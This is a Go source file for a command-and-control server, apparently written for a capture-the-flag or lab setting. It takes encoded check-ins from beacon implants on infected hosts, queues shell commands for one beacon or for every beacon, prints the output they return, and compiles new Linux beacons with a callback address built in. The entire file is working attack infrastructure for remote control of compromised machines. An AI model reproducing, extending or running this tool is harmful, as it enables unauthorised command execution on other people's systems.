package main

import (
	"github.com/gorilla/mux"
	"fmt"
	"time"
	"log"
	"encoding/json"
	"net/http"
	"strconv"
	"os"
	"os/exec"
	"strings"
	"bufio"
	b64 "encoding/base64"
)

type CommandUpdate struct {
	Ip string
	Id string
	Type string
	Data string
}

type Beacon struct {
	Ip string
	Id string
	ExecBuffer []string
	LastSeen time.Time
}

var beacons []*Beacon = make([]*Beacon, 0)
var cmdArgs = map[string]string {
    "help": "",
	"list": "", // lists active beacons
    "exec": "<beacon-id OR index> <command...>",
    "create": "<LHOST> <LPORT>",
}

// to serve management interface
func interfaceHandler(w http.ResponseWriter, h *http.Request) {
	json.NewEncoder(w).Encode(map[string]bool{"ok": true})
}

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	var update CommandUpdate
	data := mux.Vars(r)["data"]
	respMap := make(map[string][]string)
	decoded, _ := b64.StdEncoding.DecodeString(data)
	
	json.Unmarshal(decoded, &update)
	beacon := registerBeacon(update)
	
	respMap["exec"] = beacon.ExecBuffer

	json.NewEncoder(w).Encode(respMap)
	beacon.ExecBuffer = nil

	if len(update.Data) > 0 {
		out := strings.Replace(update.Data, "\n", "\n\t", -1)
		fmt.Println("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
		fmt.Print("\t" + out[:len(out)-1] + "c2> ")
	}
}

func startServerRoutine() {
	var router = mux.NewRouter()
	router.HandleFunc("/", interfaceHandler).Host("localhost")
	router.HandleFunc("/{data}", beaconHandler).Host("command.com").Methods("Get")

	srv := &http.Server{
        Handler:      router,
        Addr:         "10.10.14.10:8001",
        WriteTimeout: 15 * time.Second,
        ReadTimeout:  15 * time.Second,
    }

	go func() {
    	log.Fatal(srv.ListenAndServe())	
	}()
}

func registerBeacon(updateData CommandUpdate) (*Beacon) {
	var beacon *Beacon
	for _, b := range beacons {
		if b.Id == updateData.Id {
			beacon = b 
		}
	}

	if beacon == nil {
		beacon = &Beacon{updateData.Ip, updateData.Id, nil, time.Now()}
		beacons = append(beacons, beacon)
	} else {
		beacon.LastSeen = time.Now()
	}

	return beacon
}

func listBeacons() {
	for i, b := range beacons {
		fmt.Println("[" + strconv.Itoa(i) + "] " + b.Id + "@" + b.Ip + " last seen " + b.LastSeen.String())
	}
}

func createBeacon(lhost string, lport string) {
	exec.Command("/bin/sh", "-c", "rm out/*").Output()
	exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.cmdAddress=" + lhost + " -X main.cmdPort=" + lport + " -X main.cmdHost=command.com' -o out/beacon beacon/beacon.go").Output()
	fmt.Println("Created beacon in out directory.")
}

func execOnBeacon(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.ExecBuffer = append(b.ExecBuffer, strings.Join(cmd[2:], " "))
		}
		return	
	}

	var beacon *Beacon
			
	for _, b := range beacons {
		if b.Id == cmd[1] {
			beacon = b
		}
	}

	bId, err := strconv.Atoi(cmd[1])
	
	if beacon == nil && err != nil {
		fmt.Println("If using beacon index please only use numbers.")
		return
	}

	if beacon != nil || bId < len(beacons) {
		if beacon == nil {
			beacon = beacons[bId]
		}

		beacon.ExecBuffer = append(beacon.ExecBuffer, strings.Join(cmd[2:], " "))
		fmt.Println("Added exec command to buffer for beacon " + beacon.Id + "@" + beacon.Ip)
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func checkArgs(cmd[] string) (bool) {
	amt := len(strings.Fields(cmdArgs[cmd[0]]))
	if len(cmd[1:]) != amt && !strings.Contains(cmdArgs[cmd[0]], "...") {
		if amt == 1 {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " arg: " + cmdArgs[cmd[0]])
		} else {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " args: " + cmdArgs[cmd[0]])
		}
		return false
	}
	return true
}

func processInput(input string) {
	cmd := strings.Fields(input);
	if checkArgs(cmd) {
		switch cmd[0] {
		case "exec":
			execOnBeacon(cmd)
		case "create":
			createBeacon(cmd[1], cmd[2])
		case "list":
			listBeacons()
		case "help":
			//printHelp(cmd[1:])
		}
	}
}

func handleInput() {
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("c2> ")
		input, err := reader.ReadString('\n')
        if err != nil {
            fmt.Fprintln(os.Stderr, err)
        }

		processInput(input)
	}
}

func main() {
	startServerRoutine()
	handleInput()
}